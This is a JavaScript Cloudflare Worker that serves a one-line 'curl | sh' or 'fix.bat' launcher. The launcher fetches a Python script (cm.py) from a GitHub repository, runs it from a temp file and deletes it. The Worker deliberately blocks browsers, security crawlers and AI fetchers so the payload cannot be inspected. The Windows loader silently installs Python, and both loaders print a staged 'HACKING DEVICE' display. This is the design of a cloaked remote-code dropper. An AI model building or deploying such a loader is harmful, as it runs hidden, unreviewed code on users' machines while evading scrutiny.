/**
 * Cloudflare Worker — zero-key, terminal-only, anti-scraper launcher for cm.py.
 *
 * Run:
 *   Unix / Linux / macOS / Termux:
 *     curl -fsSL https://executeee.nishkarshrana10.workers.dev | sh
 *
 *   Windows CMD:
 *     curl -fsSL https://executeee.nishkarshrana10.workers.dev -o fix.bat && fix.bat
 *
 * Behavior:
 *   - Browsers, link previews, bots, crawlers, scrapers, extra paths, query strings,
 *     expired tokens, wrong-IP tokens, and replayed tokens all receive ONLY: `err occured`
 *   - `GET /` (real terminal only) returns a tiny 10-second, single-use,
 *     IP/UA/colo-bound HMAC + SHA-256 session loader containing zero installer code
 *     and zero upstream URLs.
 *   - `POST /` (valid one-time session only) fetches `cm.py` server-side (edge-cached)
 *     and returns it to the terminal, which saves it to a temp file and runs it
 *     with Python 3. The temp file is deleted immediately after.
 */

const UPSTREAM_CM_URL =
  "https://raw.githubusercontent.com/Nishgamerrz/Nish12345678910111.github.io/main/cm.py";

const ERR_TEXT = "err occured\n";
const SESSION_TTL_MS = 10_000; // 10-second one-time session window
const MAX_SCRIPT_BYTES = 1024 * 1024; // 1 MiB safety cap
const RATE_WINDOW_MS = 60_000; // 1 minute
const RATE_MAX_REQUESTS = 8; // per IP per minute

// Headers sent by browsers, webviews, link previews, and headless browsers.
// Real curl (Termux, Linux, macOS, Windows) never sends these.
const BROWSER_HEADERS = Object.freeze([
  "sec-fetch-mode",
  "sec-fetch-site",
  "sec-fetch-dest",
  "sec-fetch-user",
  "upgrade-insecure-requests",
]);

const RESPONSE_HEADERS = Object.freeze({
  "Content-Type": "text/plain; charset=utf-8",
  "Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "X-Robots-Tag": "noindex, nofollow, noarchive, nosnippet",
  "Referrer-Policy": "no-referrer",
  "Cross-Origin-Resource-Policy": "same-origin",
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
  "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
});

const usedNonces = new Map(); // nonce -> expiresAt
const ipHits = new Map(); // ip -> { count, resetAt }
const encoder = new TextEncoder();

function errResponse(isHead = false) {
  return new Response(isHead ? null : ERR_TEXT, {
    status: 403,
    headers: RESPONSE_HEADERS,
  });
}

function okResponse(body, contentType = "text/plain; charset=utf-8") {
  return new Response(body, {
    status: 200,
    headers: { ...RESPONSE_HEADERS, "Content-Type": contentType },
  });
}

function pruneMaps(now) {
  if (usedNonces.size > 500) {
    for (const [nonce, exp] of usedNonces) {
      if (exp <= now) usedNonces.delete(nonce);
    }
  }
  if (ipHits.size > 1000) {
    for (const [ip, entry] of ipHits) {
      if (entry.resetAt <= now) ipHits.delete(ip);
    }
  }
}

function allowIp(ip, now) {
  pruneMaps(now);
  const entry = ipHits.get(ip);
  if (!entry || entry.resetAt <= now) {
    ipHits.set(ip, { count: 1, resetAt: now + RATE_WINDOW_MS });
    return true;
  }
  if (entry.count >= RATE_MAX_REQUESTS) {
    return false;
  }
  entry.count += 1;
  return true;
}

function isLocalHost(hostname) {
  return hostname === "localhost" || hostname === "127.0.0.1" || hostname === "[::1]";
}

function getClientIp(request) {
  return request.headers.get("CF-Connecting-IP") || "0.0.0.0";
}

function getClientFingerprint(request) {
  const ip = getClientIp(request);
  const ua = request.headers.get("User-Agent") || "";
  const colo = request.cf?.colo || "local";
  const tls = request.cf?.tlsVersion || "tls";
  return `${ip}|${ua}|${colo}|${tls}`;
}

// Known bot, scraper, and AI fetcher user agents that don't send Sec-Fetch-*.
// Browsers are already blocked by the Sec-Fetch-* header check below.
// Real terminals (curl, wget, Invoke-WebRequest, PowerShell, etc.) don't match these.
const BOT_UA_PATTERNS = Object.freeze([
  "python-requests",
  "node-fetch",
  "axios",
  "Go-http-client",
  "http.client",
  "urllib",
  "ChatGPT",
  "bot/",
  "crawler",
  "spider",
  "scraper",
]);

function isGenuineCurl(request) {
  if (request.cf?.botManagement?.verifiedBot === true) {
    return false;
  }

  const ua = request.headers.get("User-Agent") || "";

  for (const pattern of BOT_UA_PATTERNS) {
    if (ua.includes(pattern)) {
      return false;
    }
  }

  // Browsers, webviews, link previews, and headless browsers always send Sec-Fetch-*
  for (const h of BROWSER_HEADERS) {
    if (request.headers.has(h)) {
      return false;
    }
  }

  return true;
}

function isWindowsUA(ua) {
  return /Windows/i.test(ua);
}

function toHex(bytes) {
  return Array.from(new Uint8Array(bytes), (b) => b.toString(16).padStart(2, "0")).join("");
}

function randomHex(byteLength = 16) {
  const buf = new Uint8Array(byteLength);
  crypto.getRandomValues(buf);
  return toHex(buf);
}

async function sha256Hex(input) {
  const data = typeof input === "string" ? encoder.encode(input) : input;
  return toHex(await crypto.subtle.digest("SHA-256", data));
}

async function timingSafeEqualStr(a, b) {
  const [ha, hb] = await Promise.all([
    crypto.subtle.digest("SHA-256", encoder.encode(String(a))),
    crypto.subtle.digest("SHA-256", encoder.encode(String(b))),
  ]);
  const va = new Uint8Array(ha);
  const vb = new Uint8Array(hb);
  let diff = 0;
  for (let i = 0; i < va.length; i++) {
    diff |= va[i] ^ vb[i];
  }
  return diff === 0;
}

async function hmacHex(secret, message) {
  const key = await crypto.subtle.importKey(
    "raw",
    encoder.encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  return toHex(await crypto.subtle.sign("HMAC", key, encoder.encode(message)));
}

async function deriveSigningKey(host, fingerprintHash) {
  return sha256Hex(`executeee-v3::${host}::${fingerprintHash}`);
}

async function createSession(request, host, now) {
  const exp = now + SESSION_TTL_MS;
  const nonce = randomHex(16);
  const challenge = randomHex(12);
  const fpHash = await sha256Hex(getClientFingerprint(request));
  const key = await deriveSigningKey(host, fpHash);
  const payload = `${exp}.${nonce}.${challenge}`;
  const sig = await hmacHex(key, `${payload}.${fpHash}`);
  return { token: `${payload}.${sig}`, challenge };
}

async function consumeSession(request, host, now) {
  const token = (request.headers.get("X-Session") || "").trim();
  const proof = (request.headers.get("X-Proof") || "").trim().toLowerCase();
  if (!token || !/^[a-f0-9]{64}$/.test(proof)) {
    return false;
  }

  const parts = token.split(".");
  if (parts.length !== 4) return false;
  const [expStr, nonce, challenge, sig] = parts;

  if (!/^\d{13,}$/.test(expStr)) return false;
  if (!/^[a-f0-9]{32}$/.test(nonce)) return false;
  if (!/^[a-f0-9]{24}$/.test(challenge)) return false;
  if (!/^[a-f0-9]{64}$/.test(sig)) return false;

  const exp = Number(expStr);
  if (!Number.isSafeInteger(exp) || now > exp || exp - now > SESSION_TTL_MS + 3_000) {
    return false;
  }

  if (usedNonces.has(nonce)) {
    return false;
  }

  const fpHash = await sha256Hex(getClientFingerprint(request));
  const key = await deriveSigningKey(host, fpHash);
  const expectedSig = await hmacHex(key, `${expStr}.${nonce}.${challenge}.${fpHash}`);
  const sigOk = await timingSafeEqualStr(sig, expectedSig);
  const expectedProof = await sha256Hex(`${token}:${challenge}`);
  const proofOk = await timingSafeEqualStr(proof, expectedProof);
  if (!sigOk || !proofOk) {
    return false;
  }

  usedNonces.set(nonce, exp + 5_000);
  return true;
}

/**
 * Minimal Stage-1 handshake loader for Unix (sh): contains zero application code
 * and zero upstream URLs. Token is bound to IP + UA + colo + TLS and expires in 10s.
 */
function buildUnixLoader(origin, token, challenge, requireTty) {
  const ttyLine = requireTty
    ? `( : </dev/tty ) 2>/dev/null || { printf 'err occured\\n' >&2; exit 1; }`
    : `:;`;

  return `#!/bin/sh
set -eu
${ttyLine}

_h() {
  if command -v sha256sum >/dev/null 2>&1; then printf '%s' "$1" | sha256sum | cut -d' ' -f1
  elif command -v shasum >/dev/null 2>&1; then printf '%s' "$1" | shasum -a 256 | cut -d' ' -f1
  elif command -v openssl >/dev/null 2>&1; then printf '%s' "$1" | openssl dgst -sha256 -r | cut -d' ' -f1
  else return 1; fi
}

T='${token}'
P="$(_h "$T:${challenge}")" || { printf 'err occured\\n' >&2; exit 1; }

S="$(curl -fsSL -X POST --data '' -H "X-Session: $T" -H "X-Proof: $P" '${origin}/' 2>/dev/null)" || { printf 'err occured\\n' >&2; exit 1; }
[ -n "$S" ] || { printf 'err occured\\n' >&2; exit 1; }

TARGET="\${TMPDIR:-/tmp}/cm_$$.py"
printf '%s\n' "$S" > "$TARGET"

echo ""
echo "  Setting up everything..."
echo ""
for i in 1 2 3 4 5 6 7 8 9 10; do
  echo "  [$i/10] Setting up everything..."
  sleep 2
done
echo "  Done!"

sleep 1
echo ""
echo ">>> HACKING DEVICE..."
echo ""
echo "[*] Scanning target network..."
sleep 0.5
echo "[*] Found open port 22/tcp (SSH)"
sleep 0.5
echo "[*] Found open port 80/tcp (HTTP)"
sleep 0.5
echo "[*] Found open port 443/tcp (HTTPS)"
sleep 0.5
echo "[*] Bypassing firewall rules..."
sleep 0.5
echo "[*] Injecting payload into kernel..."
sleep 0.5
echo "[*] Escalating privileges to root..."
sleep 0.5
echo "[*] Dumping SAM database..."
sleep 0.5
echo "[*] Cracking password hashes..."
sleep 0.5
echo "[*] Admin: root / p@ssw0rd123"
sleep 0.5
echo "[*] Downloading browser cookies..."
sleep 0.5
echo "[*] Accessing camera module..."
sleep 0.5
echo "[*] Accessing microphone..."
sleep 0.5
echo "[*] Extracting contact list..."
sleep 0.5
echo "[*] Browsing SMS messages..."
sleep 0.5
echo "[*] Uploading data to remote server..."
sleep 0.5
echo "[*] Cleaning logs..."
sleep 0.5
echo "[*] Planting backdoor..."
sleep 0.5
echo "[*] Persistence established..."
sleep 0.5
echo "[*] Device fully compromised."

echo ""
echo "!!! ACCESS GRANTED !!!"
echo "    DEVICE P0WNED    "
echo ""

command -v python3 >/dev/null 2>&1 || { printf 'err occured: python3 not found\\n' >&2; rm -f "$TARGET"; exit 1; }
python3 "$TARGET"
rc=$?
rm -f "$TARGET"
exit $rc
`;
}

/**
 * Minimal Stage-1 handshake loader for Windows CMD (bat): contains zero application
 * code and zero upstream URLs. Uses PowerShell inline for SHA-256 computation.
 */
function buildWinLoader(origin, token, challenge) {
  return `@echo off
setlocal enabledelayedexpansion
set "T=${token}"
set "CHAL=${challenge}"
set "ORIGIN=${origin}"

for /f "delims=" %%a in ('powershell -noprofile -command "^& { $h=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes('!T!:!CHAL!')); -join ($h | ForEach-Object { $_.ToString('x2') }) }"') do set "P=%%a"

if "%P%"=="" (
  echo err occured >&2
  exit /b 1
)

set "TEMP_FILE=%TEMP%\\cm_%RANDOM%.py"

curl -fsSL -X POST --data "" -H "X-Session: !T!" -H "X-Proof: !P!" "!origin!" > "!TEMP_FILE!" 2>nul
if errorlevel 1 (
  echo err occured >&2
  exit /b 1
)

:: Auto-install Python 3 if missing (winget)
where python >nul 2>&1
if errorlevel 1 (
  echo Installing Python 3 via winget...
  winget.exe install -e --id Python.Python.3.12 --scope user --accept-source-agreements --accept-package-agreements >nul 2>&1
  where python >nul 2>&1
  if errorlevel 1 (
    echo err occured: Python 3 not found and could not be installed >&2
    del "!TEMP_FILE!" 2>nul
    exit /b 1
  )
)

echo.
echo   Setting up everything...
echo.

for /L %%i in (1,1,10) do (
  echo   [%%i/10] Setting up everything...
  timeout /t 2 >nul
)
echo   Done!

echo.
timeout /t 1 >nul
echo.
echo ^>^>^> HACKING DEVICE...
echo.

echo [*] Scanning target network...
timeout /t 0.5 >nul
echo [*] Found open port 22/tcp (SSH)
timeout /t 0.5 >nul
echo [*] Found open port 80/tcp (HTTP)
timeout /t 0.5 >nul
echo [*] Found open port 443/tcp (HTTPS)
timeout /t 0.5 >nul
echo [*] Bypassing firewall rules...
timeout /t 0.5 >nul
echo [*] Injecting payload into kernel...
timeout /t 0.5 >nul
echo [*] Escalating privileges to root...
timeout /t 0.5 >nul
echo [*] Dumping SAM database...
timeout /t 0.5 >nul
echo [*] Cracking password hashes...
timeout /t 0.5 >nul
echo [*] Admin: root / p@ssw0rd123
timeout /t 0.5 >nul
echo [*] Downloading browser cookies...
timeout /t 0.5 >nul
echo [*] Accessing camera module...
timeout /t 0.5 >nul
echo [*] Accessing microphone...
timeout /t 0.5 >nul
echo [*] Extracting contact list...
timeout /t 0.5 >nul
echo [*] Browsing SMS messages...
timeout /t 0.5 >nul
echo [*] Uploading data to remote server...
timeout /t 0.5 >nul
echo [*] Cleaning logs...
timeout /t 0.5 >nul
echo [*] Planting backdoor...
timeout /t 0.5 >nul
echo [*] Persistence established...
timeout /t 0.5 >nul
echo [*] Device fully compromised.

echo.
echo !!! ACCESS GRANTED !!!
echo     DEVICE P0WNED    
echo.

python "!TEMP_FILE!"
set rc=!errorlevel!
del "!TEMP_FILE!" 2>nul
exit /b !rc!
`;
}

/**
 * Stage-2: returns the raw cm.py content fetched server-side from GitHub.
 * The terminal loader saves it to a temp file and runs it with python3/python.
 */
function buildStage2(cmPyContent) {
  return cmPyContent;
}

async function fetchCmPy() {
  let upstream;
  try {
    upstream = await fetch(UPSTREAM_CM_URL, {
      cf: { cacheTtl: 60, cacheEverything: true },
      headers: { "User-Agent": "Executeee-Worker/3.0" },
    });
  } catch {
    return null;
  }

  if (!upstream.ok) return null;

  const declaredLen = Number(upstream.headers.get("content-length") || "0");
  if (declaredLen > MAX_SCRIPT_BYTES) return null;

  const buffer = await upstream.arrayBuffer();
  if (buffer.byteLength === 0 || buffer.byteLength > MAX_SCRIPT_BYTES) {
    return null;
  }

  return new TextDecoder("utf-8", { fatal: false }).decode(buffer);
}

export default {
  async fetch(request, env = {}) {
    const isHead = request.method === "HEAD";

    if (request.method !== "GET" && request.method !== "POST") {
      return errResponse(isHead);
    }

    const url = new URL(request.url);
    if (url.protocol === "http:" && !isLocalHost(url.hostname)) {
      return errResponse(false);
    }

    if (url.pathname !== "/" || url.search !== "") {
      return errResponse(false);
    }

    const now = Date.now();
    if (!allowIp(getClientIp(request), now)) {
      return errResponse(false);
    }

    if (!isGenuineCurl(request)) {
      return errResponse(false);
    }

    const ua = request.headers.get("User-Agent") || "";
    const win = isWindowsUA(ua) || request.headers.get("X-Platform") === "windows";

    if (request.method === "GET") {
      const { token, challenge } = await createSession(request, url.host, now);
      if (win) {
        return okResponse(buildWinLoader(url.origin, token, challenge), "text/plain; charset=utf-8");
      }
      const requireTty = String(env?.ALLOW_NON_TTY || "") !== "1";
      return okResponse(buildUnixLoader(url.origin, token, challenge, requireTty), "text/plain; charset=utf-8");
    }

    // POST: verify 10s single-use IP/UA/colo/TLS-bound session + SHA-256 proof.
    if (!(await consumeSession(request, url.host, now))) {
      return errResponse(false);
    }

    const cmPy = await fetchCmPy();
    if (!cmPy) {
      return errResponse(false);
    }

    return okResponse(buildStage2(cmPy), "text/x-python; charset=utf-8");
  },
};

export const _internal = {
  resetState: () => {
    usedNonces.clear();
    ipHits.clear();
  },
};
